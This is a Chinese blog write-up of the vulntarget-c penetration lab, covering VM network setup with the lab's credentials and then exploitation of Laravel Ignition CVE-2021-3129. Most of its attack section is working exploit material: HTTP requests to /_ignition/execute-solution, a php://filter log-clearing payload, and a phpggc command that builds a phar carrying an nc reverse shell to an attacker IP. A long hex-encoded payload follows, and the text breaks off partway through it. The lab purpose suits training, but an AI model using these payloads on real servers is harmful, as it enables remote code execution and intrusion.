        <content type="html"><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>相关漏洞技术：laravel、OVAS-PHP相关漏洞、隧道代理、免杀、提权、CVE-2021-3129<br>、CVE-2021-3493等<br>下载地址：<br>百度云链接:<br><a href="https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q">https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q</a><br>提取码: 1p9p</p><p>其中vulntarget-c是本次环境</p><p>github地址：</p><p><a href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p><h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="/images/vulntarget-e/image-20221129102253692.png" alt="image-20221129102253692"></p><h4 id="vm网卡配置"><a href="#vm网卡配置" class="headerlink" title="vm网卡配置"></a>vm网卡配置</h4><p>将百度网盘的靶场c下载下来，使用vm打开，我们先编辑一下虚拟网卡网段</p><p><img src="/images/vulntarget-e/image-20221129102606686.png" alt="image-20221129102606686"></p><p>这里要注意不勾选将主机虚拟连接到此网络，如果勾选的话，你会发现，我们直接能从主机ping到10，20段，这样就不是内网了。</p><p>第一台是ubuntu20</p><p><img src="/images/vulntarget-e/image-20221129102818958.png" alt="image-20221129102818958"></p><p>第二台win2016</p><p><img src="/images/vulntarget-e/image-20221129102845711.png" alt="image-20221129102845711"></p><p>第三台ubuntu16</p><p><img src="/images/vulntarget-e/image-20221129102914418.png" alt="image-20221129102914418"></p><p>设置好之后开机，但是还是有一点问题，默认作者配置的时候给到的是静态ip30段的，我们需要改一下，我这边net是144段的，所以我们给网卡一个144段的静态IP就可以了</p><p><code>账密1：vulntarget/root</code><br><code>账密2：root/root#qwe</code></p><p>用root账号登录一下，改掉网卡配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">root<span class="comment">#qwe</span></span><br><span class="line">vim /etc/netplan/00-installer-config.yaml <span class="comment">#编辑网卡配置文件</span></span><br><span class="line">:wq</span><br><span class="line">netplan apply <span class="comment">#重启网卡</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129103520466.png" alt="image-20221129103520466"></p><p><img src="/images/vulntarget-e/image-20221129103635589.png" alt="image-20221129103635589"></p><p>这里注意网关也改一下，当然这里网卡不唯一，我这样后面比较简单不需要改网卡配置文件了</p><p>我们简单扫一下<img src="/images/vulntarget-e/image-20221129104349743.png" alt="image-20221129104349743"></p><p>可以看到55的ip开着80和22，访问一下</p><p><img src="/images/vulntarget-e/image-20221129104507816.png" alt="image-20221129104507816"></p><p>至此在vm上环境搭建已经完成</p><h3 id="laravel渗透-CVE-2021-3129"><a href="#laravel渗透-CVE-2021-3129" class="headerlink" title="laravel渗透-CVE-2021-3129"></a>laravel渗透-CVE-2021-3129</h3><p>我们可以看到是一个laravel的框架网站，既然靶场，那肯定存在漏洞，在右下角我们也可以看到Laravel v8.78.1 (PHP v7.4.3)，那肯定是复现laravel历史漏洞了。网上搜一下版本号，(可以看到其他佬发的这个靶场wp，确定CVE-2021-3129),发现是2021-3129，反正我是没有发现，因为看文章都是说影响版本在Laravel&lt;=8.4.2,<code>https://www.freebuf.com/vuls/280508.html</code>,但是靶机环境在8.78，也有可能是，<code>Ignition（&lt;=2.5.1）</code>,这个插件的版本的问题，这个文章说的，<code>https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</code><br>emmmm就当发现了吧。我们去复现一下。</p><p>首先肯定是github找各种poc，我也找了各种poc，都打了一遍，emmmm，都没打通，不是php报错就是not fund rce ，可能是kali的问题，没有去其他系统测试，有兴趣的小伙伴测试一下。</p><p><code>http://wiki.peiqi.tech/wiki/frame/Laravel/Laravel%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129.html</code><br><code>https://github.com/SNCKER/CVE-2021-3129</code><br><code>https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</code></p><p><img src="/images/vulntarget-e/image-20221129174149286.png" alt="image-20221129174149286"></p><p><img src="/images/vulntarget-e/image-20221129174203408.png" alt="image-20221129174203408"></p><p>这几个poc都试了一下，没有打通，没有关系，我们手工复现一下。<br>参考下面这篇文章</p><p><code>https://www.freebuf.com/vuls/280508.html</code><br>具体原理这里就不赘述了，直接打</p><p>先访问网站，抓包，然后我们可以看到包里有许多内容，把下面的删掉，然后只留四行</p><p><img src="/images/vulntarget-e/image-20221129175857744.png" alt="image-20221129175857744"></p><p><img src="/images/vulntarget-e/image-20221129180059768.png" alt="image-20221129180059768"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>168</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到能够执行，</p><p>下载GitHub上下载的docker环境中带有exp，使用此exp需要下载phpggc</p><p><code>git clone https://github.com/ambionics/phpggc.git</code></p><p>改一下777的权限，下面生成poc的时候会用到</p><p>这里我们生成poc。要到刚刚phpggc目录下，上面那篇文章中已经有phpinfo了，跟着复现就行了，亲测phpinfo没有问题。因为我上面exp脚本都不能用，所以想着搜一个手工复现的打webshell的方法，奈何网上的方法都只到phpinfo就结束了，并没有生成webshell的，因为这里面我们打一遍phpinfo之后，日志文件会重新生成，🐎并不会留着日志里，所以我们要有一个反弹shell的方法，或者生成webshell，经过测试，太菜了，fileputcontent没有成功，echo也没有成功，但是没给poc，我们自己打一下</p><p>这里是反弹shell的，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php7.4 -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.144.128 9999 &gt;/tmp/f&#x27;);phpinfo();&quot;</span> --phar phar -o php://output | base64 -w 0 | python -c <span class="string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129182228006.png" alt="image-20221129182228006"></p><p>生成一串码，</p><p>上面已经证明漏洞存在</p><p>然后bp发包，清空日志</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>328</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">![image-20221129201015519](/images/vulntarget-e/image-20221129201015519.png)</span><br><span class="line"></span><br><span class="line">发送如下数据包，给Log增加一次前缀，用于对齐：</span><br><span class="line"></span><br><span class="line">```http</span><br><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.144.55</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201219036.png" alt="image-20221129201219036"></p><p>将POC作为viewFile的值，发送数据包，这里最后有个a别忘了。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5514</span><br><span class="line"></span><br><span class="line"><span class="dns">&#123;</span></span><br><span class="line"><span class="dns">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line"><span class="dns">  &quot;parameters&quot;: &#123;</span></span><br><span class="line"><span class="dns">    &quot;variableName&quot;: &quot;username&quot;,</span></span><br><span class="line"><span class="dns">    &quot;viewFile&quot;: &quot;=<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=70=00=63</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=53</span>=<span class="number">00=57=00=78</span>=<span class="number">00=73=00=64</span>=<span class="number">00=57=00=31</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=56=00=78</span>=<span class="number">00=43=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=39=00=68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=68=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=64=00=63</span>=<span class="number">00=55=00=47</span>=<span class="number">00=56=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=48</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=58=00=45</span>=<span class="number">00=52=00=70</span>=<span class="number">00=63=00=33</span>=<span class="number">00=42=00=68</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=59</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=46</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=56</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=78=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=54</span>=<span class="number">00=47=00=39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=56</span>=<span class="number">00=32=00=59</span>=<span class="number">00=57=00=78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00=31=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=73=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=51=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=67=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=76=00=59</span>=<span class="number">00=57=00=52</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=59=00=58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=45</span>=<span class="number">00=56=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=35</span>=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=35=00=58</span>=<span class="number">00=45=00=64</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=59=00=58</span>=<span class="number">00=52=00=76</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=72=00=52</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=35=00=70</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=76=00=62</span>=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=63=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=52</span>=<span class="number">00=32=00=56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=39</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=31</span>=<span class="number">00=76=00=59</span>=<span class="number">00=32=00=74</span>=<span class="number">00=44=00=62</span>=<span class="number">00=32=00=35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=64=00=31</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00=61=00=57</span>=<span class="number">00=39=00=75</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=49=00=67</span>=<span class="number">00=41=00=71</span>=<span class="number">00=41=00=47</span>=<span class="number">00=35=00=68</span>=<span class="number">00=62=00=57</span>=<span class="number">00=55=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span 